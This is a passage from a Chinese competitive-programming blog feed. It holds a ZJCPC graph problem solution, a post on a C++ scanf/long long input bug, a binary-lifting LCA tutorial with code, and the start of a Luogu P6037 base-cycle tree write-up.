class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> head[maxn],dis[maxn][<span class="number">30</span>],cnt,n,m;</span><br><span class="line"><span class="keyword">int</span> vis1[maxn];</span><br><span class="line"><span class="keyword">int</span> vis2[maxn];</span><br><span class="line"><span class="keyword">int</span> d[maxn];</span><br><span class="line">priority_queue&lt;P,vector&lt;P&gt;,greater&lt;P&gt; &gt; p;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal_c</span><span class="params">(<span class="keyword">int</span> child,<span class="keyword">int</span> ancestor)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(child&gt;ancestor)&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        child&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].next=head[x];</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    head[x]=cnt;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">    p.<span class="built_in">push</span>(&#123;<span class="number">0</span>,root&#125;);</span><br><span class="line">    d[root]=<span class="number">0</span>;</span><br><span class="line">    vis2[root]=root;</span><br><span class="line">    <span class="keyword">while</span>(!p.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=p.<span class="built_in">top</span>();</span><br><span class="line">        p.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> point=x.second;</span><br><span class="line">        <span class="keyword">if</span>(vis1[point]==root)<span class="keyword">continue</span>;</span><br><span class="line">        vis1[point]=root;</span><br><span class="line">        dis[point][<span class="built_in">cal_c</span>(point,root)]=d[point];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=head[point];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(to&lt;root)<span class="keyword">continue</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(vis2[to]!=root)&#123;</span><br><span class="line">                d[to]=INF;</span><br><span class="line">                vis2[to]=root;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span>(d[point]+edge[i].w&lt;d[to])&#123;</span><br><span class="line">                d[to]=d[point]+edge[i].w;</span><br><span class="line">                p.<span class="built_in">push</span>(&#123;d[to],to&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(a!=b)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a&gt;b)a&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> b&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis)); </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">dijkstra</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> q;</span><br><span class="line">    cin&gt;&gt;q;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="keyword">int</span> lca=<span class="built_in">LCA</span>(x,y);</span><br><span class="line">        <span class="keyword">int</span> lx=<span class="built_in">cal_c</span>(x,lca),ly=<span class="built_in">cal_c</span>(y,lca);</span><br><span class="line">        <span class="keyword">int</span> ans=INF;</span><br><span class="line">        <span class="keyword">while</span>(lca)&#123;</span><br><span class="line">            ans=<span class="built_in">min</span>(ans,dis[x][lx]+dis[y][ly]);</span><br><span class="line">            lx++,ly++;</span><br><span class="line">            lca&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ans==INF)<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>蒟蒻的提交记录。</p><p><a href="https://codeforces.com/gym/103055/problem/D">测评网站</a></p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/4.png" alt="8"></p><p>至于踩的那几个坑嘛，就是 $long long$ 的问题了，然后还有一点就是输入的问题，这个具体看我上一篇博客吧，我到现在还没太弄懂，不过至少能注意规避的技巧了：那就是千万别在开</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>的情况下用 $scanf$ 去读取 $long long$ 数据，不然你会怀疑人生。</p><p>希望这次省赛能超越上次的自己吧，$xia0ji233,fighting！！！$</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> LCA </category>
          
          <category> 最短路径 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++文件的输入输出问题</title>
      <link href="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>今天写这篇博客纯粹就是遇到点问题，不知道有没有人遇到过。</p><span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近打CF的时候发现交上去一个答案发生了非预期退出，而且是在样例里面发生的，于是我赶紧把程序扒下来最大限度地确定出现问题的代码段，最终出现了以下代码写的程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> q;</span><br><span class="line">    cin&gt;&gt;q;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> s,t;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld&quot;</span>,&amp;s,&amp;t);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s=%lld t=%lld\n&quot;</span>,s,t); </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先万能头文件，然后我打开了一个文件把标准输入流重定向到一个文件中，并且关闭了 $cin$ 和 $cout$ 的同步流，大概率问题是出在这里的，然后就一些常规操作没什么好说的。</p><p>我的 $1.in$ 的文件内容如下图所示：</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt="1"></p><p>是正常的输入数据，并且文件编码为 $UTF-8$ 没有任何问题。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>那么我们开 $DEV$ 运行以下先。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/2.png" alt="2"></p><p>可以看到程序运行出现了非预期结果。</p><p>由于 $DEV$ 不方便调试我们便把 $IDE$ 换成了 $VScode$ 。</p><p>这里我们在 $scanf$ 和 $printf$ 分别打一个断点，然后开启调试模式。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/3.png" alt="3"></p><p>这里 $s$ 和 $t$ 是随机值正常，因为我们并没有初始化 $s$ 和 $t$ 。</p><p>那么我们 $F10$ 步过看看结果。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/4.png" alt="4"></p><p>过了 $scanf$ 却没有成功读入数据！！！这是为什么？</p><p>我开始尝试找不同的原因，原因1就是怀疑文件读入的问题，所以我们先注释重定向那一行测试看看。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/5.png" alt="5"></p><p>运行结果是正常的，这么看来问题似乎解决了。</p><p>但是提交给oj是实实在在地报错了，因此我们尝试注释其它代码看看情况，这里我们接着选择注释这个关闭同步流的代码。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/6.png" alt="6"></p><p>这回居然正常读入了数据！什么鬼？</p><p>因为刚刚我把 $freopen$ 注释了是确确实实读入没有什么问题了，但是现在似乎把</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>给关闭了程序也是能正常进行的。</p><p>而且这里我还测试了第三种情况：两者都打开，把 $long long$ 换回 $int$ 类型。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/7.png" alt="7"></p><p>居然也是正常读入？也就是说，打开文件，在关闭同步流的情况下使用 $scanf$ 读入 $long long$ 数据类型会导致读入不成功，而且注释了打开文件提交给 oj 测评返回了错误结果。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我个人感觉可能涉及到底层的一些问题了。因为自己测试确实三种情况同时满足会导致读入数据失败。这三种情况分别是</p><ol><li>重定向 $stdin$ 到一个文件</li><li>关闭IO同步流</li><li>用 $scanf$ 读入 $long long$ 数据</li></ol><p>一般来说，$scanf$ 不接收到 $EOF$ 信号是会一直等待你输入的。常见的 $EOF$ 基本就是读到文件尾，或者手动给终端了一个 $Ctrl + Z$ 信号给程序，这应该算外部中断了。就基本不会遇到 $scanf$ 读入失败的情况。要真的能有这么好数据那不是可以随便泄露？如果上一个栈帧保存的一些变量的地址刚好在这，我这里故意读入失败那就直接泄露地址，我没见过这样的情况。</p><p>当然我比较浅薄，只能看到表面上的一些东西，如果你有深层次点的合理的解释麻烦你也联系我，我也不想就在这里留一个错误的结论，期待这个问题能早点解决。</p><p>下面我也给出以下本次实验用到的<a href="broken.zip">附件</a>供大家测试，看看能不能是版本的问题。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> stdin </category>
          
          <category> stdout </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最近公共祖先求解</title>
      <link href="/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>最近来复习一遍图论的板子——LCA。</p><span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>最近公共祖先</strong>（英语：lowest common ancestor）是指在一个<a href="https://zh.wikipedia.org/wiki/%E6%A0%91_(%E5%9B%BE%E8%AE%BA)">树</a>或者<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE">有向无环图</a>中同时拥有<em>v</em>和<em>w</em>作为后代的最深的节点。在这里，我们定义一个节点也是其自己的后代，因此如果<em>v</em>是<em>w</em>的后代，那么<em>w</em>就是<em>v</em>和<em>w</em>的最近公共祖先。(fron wiki)</p><h3 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h3><p>我们先来看看应该怎么解决此类问题。</p><h4 id="一般思路"><a href="#一般思路" class="headerlink" title="一般思路"></a>一般思路</h4><p>在一个树上，我们定义离根节点最远的与a,b相同的祖先为最近公共祖先(LCA)。我们需要怎么做呢，首先肯定是 dfs 跑一遍，把所有的点的层次遍历出来，时间复杂度为 $O(N)$。一般情况下 $LCA$ 问题会有多次询问，询问次数一般为 $q&lt;10^5$ ，那么就意味着我们不能在线性时间内去计算 $LCA$，如果采取最朴素的方法：选定2个点，若深度不一样则先转为深度一样，深度较深的点不停求它的父亲节点直到深度一样，然后用如下代码去求解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(a!=b)&#123;</span><br><span class="line">        a=pre[a];</span><br><span class="line">        b=pre[b];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样当然可以，而且非常符合最近公共祖先的定义，只是只需要稍微构造一下数据就可以 $T$ 到飞起。</p><h4 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h4><p>有一点不难发现：如果我和你有一个公共祖先，则公共祖先的祖先一定也是我们的公共祖先。比如亲兄弟之间，它们的公共祖先就是它们的父母（这里我们假设父母是一个人，爷爷奶奶姥姥姥爷等也是一个人），父母的祖先也就是爷爷奶奶它们同样也是这亲兄弟的公共祖先。再有一个，如果我们两个人的父亲不相同，则我们的公共祖先也等于我们父亲之间的公共祖先，这个都是能直接得到的结论。那么它在一定意义上是有序的，我们就可以采用倍增+二分的思路。</p><p>假设 $fa[a][k]$ 为差 $a$ 点 $2^k$ 辈的祖先，$fa[a][0]$ 就表示 $a$ 的父亲。在搜索的时候我们先观察节点所在的深度然后取得离他们最远的公共祖先。也就是 $fa[a][log_2deep[a]]$ </p><p>但是你可能会发现，如果深度为7，那么它最多只能往上找 $4$ 个祖先，而如果公共祖先刚好是根节点，那么怎么办呢？那么我们不选择缩小区间，而是把 $a,b$ 当成新的对象来算公共祖先。那你有会发现，如果再往上找4个，那么会没有这个值，那怎么办呢？其实我们不需要它有，我们只需要它相等即可。因为根节点一定是所有节点之间的公共祖先，所以我们直接就这么找，找到相等区间往里面缩小一半，就往上找2个祖先，这时候可以发现刚好在根节点之前，如果它们的最近公共祖先是根节点，那么同理，这次寻找又会往上再找两个祖先。又跑到了根节点之外，判断相等，区间缩小为1。区间缩小为1的时候退出循环，此时我们要找的最近公共祖先就在当前点的父亲节点。</p><p>不知道这是否能解决你在运用倍增法求 $LCA$ 的疑惑。</p><p>可以看到每次以树的高度为范围，区间缩小一半地求，效率是非常高的。求一次 $LCA$ 的时间复杂度仅仅为 $log_2n$。</p><h2 id="题目练手"><a href="#题目练手" class="headerlink" title="题目练手"></a>题目练手</h2><p><a href="https://www.luogu.com.cn/problem/P3379">洛谷P3379</a> </p><p>标版，直接打就完事了。这里需要注意一下，如果深度不一样那么先平衡深度这个操作，这个操作我们并不是也要一个一个平衡的，也可以用倍增的思路。我先算出两深度之差，把差拆分为二进制比特位，如果从第往高第 $i$ 位为 $1$，那么我就往前寻找 $2^i$ 个祖先，而从当前点往前寻找 $2^i$ 个祖先我们可以直接用 $fa[now][i]$ 来快速求得。如果它构造特殊数据，那么直接一位一位往前寻找平衡深度可能会导致超时。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt,lg[maxn],n,q,s;</span><br><span class="line"><span class="keyword">int</span> fa[maxn][<span class="number">25</span>],depth[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">    fa[now][<span class="number">0</span>]=p;</span><br><span class="line">    depth[now]=depth[p]+<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;point=%d deep=%d\n&quot;,now,depth[now]);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=lg[depth[now]];i++)&#123;</span><br><span class="line">        fa[now][i]=fa[fa[now][i<span class="number">-1</span>]][i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(to!=p)</span><br><span class="line">            <span class="built_in">dfs</span>(to,now);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(depth[a]&gt;depth[b])&#123;</span><br><span class="line">        <span class="built_in">swap</span>(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> x=depth[b]-depth[a];</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;a=%d,b=%d\n&quot;,a,b);</span></span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            b=fa[b][k];</span><br><span class="line">        &#125;</span><br><span class="line">        k++;</span><br><span class="line">        x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;deep=%d\n&quot;,depth[b]);</span></span><br><span class="line">    k=lg[depth[a]];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,a,b);</span><br><span class="line">    <span class="keyword">while</span>(k!=<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;k=%d\n&quot;</span>,k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,fa[a][k],fa[b][k]);</span><br><span class="line">        <span class="keyword">if</span>(fa[a][k]==fa[b][k])k--;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a=fa[a][k];</span><br><span class="line">            b=fa[b][k];</span><br><span class="line">            <span class="comment">//k=lg[depth[a]];</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(a==b)<span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> fa[a][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;q&gt;&gt;s;</span><br><span class="line">    lg[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;&gt;(lg[i<span class="number">-1</span>]+<span class="number">1</span>))lg[i]=lg[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> lg[i]=lg[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="built_in">add</span>(x,y);</span><br><span class="line">        <span class="built_in">add</span>(y,x);</span><br><span class="line">    &#125;</span><br><span class="line">    depth[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">dfs</span>(s,s);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">LCA</span>(a,b));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> LCA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷P6037题解</title>
      <link href="/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P6037">洛谷P6037</a>题解</p><span id="more"></span><h2 id="浅谈基环树-环套树"><a href="#浅谈基环树-环套树" class="headerlink" title="浅谈基环树(环套树)"></a>浅谈基环树(环套树)</h2><p>在题目开始之前，就唠一唠这个叫基环树的结构。准确来说，基环树它已经不是树了，我们知道，树一定是由 $n$ 点和 $n-1$ 条边组成的。而基环树是由 $n$ 点与 $n$ 边组成。但是因为它跟树还是很像，并且在保证连通的情况下有且仅有一个简单环，因此得名。如果不连通，那么它会成为基环树森林。</p><p><img src="/2022/02/11/%E6%B4%9B%E8%B0%B7P6037%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><p>比如上图就是一个基环树。我们可以很清楚的看出来，点 $2,1,3,7$ 形成了环，断开任意一条属于环中的边都会使这个棵基环树成为树。一般情况下都是将环和环连接的子树进行分开讨论。如何求环呢？我们只需要 dfs 一遍就行了，如果遇到被访问过的点，那就依次返回路径上的所有点，直到我遇到的那个点为止。</p><p>举个例子，在上图中，我从 6 开始 dfs，假设它经历了 $6 \to 2 \to 1 \to 3 \to 7$ 的顺序。那么接下来在搜索 7 的时候就会发现与它相连的点 2 已经被访问过，那么我返回值给个 2，依次回溯，回溯过程中将点入栈或者入一个 $vector$ 都可以。直到回溯到 2 这个点为止。环就被我们求出来了。</p><p>能求出环我们就会很好做这类的题目了，那么我们具体看看这题吧。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Ryoku 所处的世界可以抽象成一个有 n 个点， n条边的带权无向连通图 G。每条边有美观度和长度。</p><p>Ryoku 会使用这样一个策略探索世界：在每个点寻找一个<strong>端点她未走过</strong>的边中<strong>美观度最高</strong>的走，如果没有边走，就沿着她前往这个点的边返回，类似于图的<strong>深度优先遍历</strong>。</p><p>探索的一个方案的长度是这个方案所经过的所有边长度的和（返回时经过的长度不用计算）。</p><p>她想知道，对于每一个起点 $s=1,2,\cdots,n$，她需要走过的长度是多少？</p><hr><p>$n$ 个点 $n$ 条边的连通图，那么肯定就是基环树了然后它会根据美观度与深度优先的一种搜索策略，即遇到分支先沿一条分支走完再走另一条分支，并且多条分支优先搜索美观度高的分支。回溯走的路不算，问你以不同的点为起点搜索完所有的点需要走多少长度。</p><p>我们不难得出，如果要遍历 $n$ 个点，我们只需要走过 $n-1$ 